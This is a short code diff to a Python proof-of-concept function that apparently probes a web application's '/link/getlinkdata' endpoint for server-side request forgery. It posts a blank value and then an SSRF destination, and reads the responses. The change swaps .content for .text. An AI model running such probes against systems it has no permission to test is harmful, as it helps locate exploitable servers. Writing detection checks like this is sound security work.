@@ -29,10 +29,10 @@ def poc(url):
         url = 'http://' + url
     targeturl = url.rstrip('/') + "/link/getlinkdata"
     try:
-        c = requests.post(targeturl, data={'url': '  '}, headers=header, timeout=req_timeout).content
+        c = requests.post(targeturl, data={'url': '  '}, headers=header, timeout=req_timeout).text
         if 'invalid_url' not in c:
             return False
-        c = requests.post(targeturl, data={'url': ssrf_dst}, headers=header, timeout=req_timeout).content
+        c = requests.post(targeturl, data={'url': ssrf_dst}, headers=header, timeout=req_timeout).text
         if 'invalid_url' not in c:
             return True
     except Exception as e:
